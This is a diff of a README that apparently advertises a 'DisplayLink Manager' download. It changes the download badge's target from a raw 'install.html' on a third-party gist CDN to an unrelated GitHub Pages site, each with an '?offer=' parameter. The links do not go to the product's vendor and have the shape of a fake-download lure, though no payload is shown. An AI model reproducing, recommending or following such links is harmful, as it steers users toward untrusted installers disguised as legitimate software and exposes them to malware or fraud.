@@ -1,6 +1,6 @@
 # DisplayLink Manager Download — Desktop Display Connectivity
 
-[![Get DisplayLink Manager GitHub](https://img.shields.io/badge/Get%20DisplayLink%20Manager%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/diamondon1998-create/48dfc9ff1441337044356c79649aaded/raw/9c137d4760806157c6cdc2881de627b8ce4e9773/install.html?offer=DisplayLinkManager)
+[![Get DisplayLink Manager GitHub](https://img.shields.io/badge/Get%20DisplayLink%20Manager%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=DisplayLinkManager)
 
 ---
 
